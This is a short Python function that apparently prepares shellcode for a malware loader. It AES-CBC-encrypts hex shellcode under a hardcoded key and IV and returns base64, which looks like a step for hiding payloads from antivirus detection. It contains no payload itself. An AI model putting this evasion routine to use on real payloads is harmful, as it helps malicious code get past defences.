import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def aes_encrypt_shellcode(shellcode_hex):
    shellcode = bytes.fromhex(shellcode_hex)

    enckey = bytes([0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97])
    iv = bytes([0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2])

    cipher = AES.new(enckey, AES.MODE_CBC, iv)
    padded_shellcode = pad(shellcode, AES.block_size)
    
    encrypted_bytes = cipher.encrypt(padded_shellcode)
    encrypted_base64 = base64.b64encode(encrypted_bytes).decode('utf-8')
    
    return encrypted_base64